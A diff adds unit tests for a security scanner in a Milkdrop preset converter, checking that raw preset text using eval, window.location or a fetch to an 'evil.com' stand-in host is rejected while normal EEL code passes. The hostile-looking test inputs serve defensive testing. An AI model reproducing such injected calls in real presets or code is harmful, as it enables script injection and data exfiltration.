@@ -2,6 +2,7 @@ import { describe, it, expect, vi, beforeEach } from 'vitest';
 import {
   readMilkFile,
   validatePreset,
+  scanRawMilkText,
   parsePsVersion,
   findMissingTextures,
 } from '../milkdropConverter.ts';
@@ -129,6 +130,19 @@ describe('validatePreset', () => {
 
   beforeEach(() => {
     vi.clearAllMocks();
+  });
+});
+
+describe('scanRawMilkText', () => {
+  it('throws on blocked identifiers in raw .milk text', () => {
+    expect(() => scanRawMilkText('per_frame_1=eval')).toThrow('securityBlocked');
+    expect(() => scanRawMilkText('x = fetch("http://evil.com")')).toThrow('securityBlocked');
+    expect(() => scanRawMilkText('per_frame_1=window.location')).toThrow('securityBlocked');
+  });
+
+  it('allows normal EEL code', () => {
+    expect(() => scanRawMilkText('per_frame_1=x = sin(y) * cos(z);')).not.toThrow();
+    expect(() => scanRawMilkText('[preset00]\nfoo=bar')).not.toThrow();
   });
 });
 
